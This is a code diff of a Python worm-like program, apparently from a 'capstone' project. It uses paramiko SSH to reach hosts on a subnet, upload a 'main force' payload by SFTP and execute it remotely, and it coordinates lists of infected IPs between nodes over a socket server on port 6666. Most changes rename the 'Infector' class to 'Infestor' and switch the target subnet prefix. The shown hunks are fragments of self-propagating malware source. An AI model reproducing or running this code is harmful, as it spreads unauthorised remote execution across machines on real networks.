@@ -7,7 +7,7 @@ import paramiko
 from addr import IADDR, INFECTED
 
 SERVER_PORT = 6666
-TARGET_HOST = '192.168.189.'
+TARGET_HOST = '100.100.100.'
 TARGET_PORT = 22
 PARENT_FOLDER = '/tmp'
 FOLDER_PATH = PARENT_FOLDER + '/capstone/'
@@ -57,8 +57,8 @@ def myerr(*args):
 
 
 class Host(object):
-    def __init__(self, ip, infector):
-        self.infector = infector
+    def __init__(self, ip, infestor):
+        self.infestor = infestor
         self.ip = ip
         self.username = ''
         self.password = ''
@@ -89,7 +89,7 @@ class Host(object):
     def send_main_force(self):
         sftp = self.ssh.open_sftp()
         sftp.put(MAIN_FORCE_LOCATION, MAIN_FORCE_LOCATION)
-        mylog('N sends main force to {0}, N is {1}'.format(self.ip, self.infector))
+        mylog('N sends main force to {0}, N is {1}'.format(self.ip, self.infestor))
         stdout, stderr = self.exec_command_error('python {0}'.format(MAIN_FORCE_LOCATION))
         if len(stderr) > 0:
             mylog(stderr)
@@ -124,16 +124,16 @@ class Host(object):
     #     t.start()
     #
     # def run_python(self):
-        stdout, stderr = self.exec_command_error('python {0} {1}'.format(FILE_LOCATION, self.infector))
+        stdout, stderr = self.exec_command_error('python {0} {1}'.format(FILE_LOCATION, self.infestor))
         if len(stderr) > 0:
             mylog('python in', self.ip, stderr, '\n', stdout)
 
 
-class Infector:
+class Infestor:
     def __init__(self):
         self.hosts = {}
         self.infected = []
-        self.infector_ip = ''
+        self.infestor_ip = ''
         self.infected_count = 0
         self.self_ip = self.get_local_ip()
         self.pl = self.get_pl()
@@ -167,7 +167,7 @@ class Infector:
     def clean_addr(self, hs):
         hosts = set(self.infected)
         hosts.add(self.self_ip)
-        mylog('infected and infector IP: {0}, {1}'.format(self.infected, self.infector_ip))
+        mylog('infected and infestor IP: {0}, {1}'.format(self.infected, self.infestor_ip))
         for h in hs:
             if h not in self.infected:
                 hosts.add(h)
@@ -219,7 +219,7 @@ class Infector:
         mylog('B send ips to C')
         with open(LIST_LOCATION, 'r+') as f:
             for peer_ip in f.readlines():
-                data = '{0},{1}'.format(self.infector_ip, self.self_ip)
+                data = '{0},{1}'.format(self.infestor_ip, self.self_ip)
                 c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 peer_addr = (peer_ip, SERVER_PORT)
                 c.connect(peer_addr)
@@ -229,11 +229,11 @@ class Infector:
                     c.close()
 
     # C2A
-    def send_infector(self, ips):
-        infector, infected = ips
-        mylog('C send infected ip to {0}'.format(infector))
+    def send_infestor(self, ips):
+        infestor, infected = ips
+        mylog('C send infected ip to {0}'.format(infestor))
         c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        peer_addr = (infector, SERVER_PORT)
+        peer_addr = (infestor, SERVER_PORT)
         c.connect(peer_addr)
         try:
             c.sendall(infected)
@@ -242,9 +242,9 @@ class Infector:
 
     # A2N
     def request_main_force(self):
-        mylog('A sends the request to N: {0}'.format(self.infector_ip))
+        mylog('A sends the request to N: {0}'.format(self.infestor_ip))
         c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        peer_addr = (self.infector_ip, SERVER_PORT)
+        peer_addr = (self.infestor_ip, SERVER_PORT)
         c.connect(peer_addr)
         try:
             c.sendall(MAIN_FORCE_REQUEST_BODY)
@@ -295,7 +295,7 @@ class Infector:
                             if client_addr != target_ip:
                                 myerr('sender\'s ip error')
                             else:
-                                self.send_infector(data.split(','))
+                                self.send_infestor(data.split(','))
                         else:
                             mylog('receive ips as A')
                             # A
@@ -313,7 +313,7 @@ class Infector:
     # A
     def run(self):
         mylog('start')
-        self.infector_ip = IADDR
+        self.infestor_ip = IADDR
         self.infected = INFECTED
 
         if self.self_ip not in self.pl:
@@ -325,5 +325,5 @@ class Infector:
 
 
 if __name__ == '__main__':
-    i = Infector()
+    i = Infestor()
     i.run()
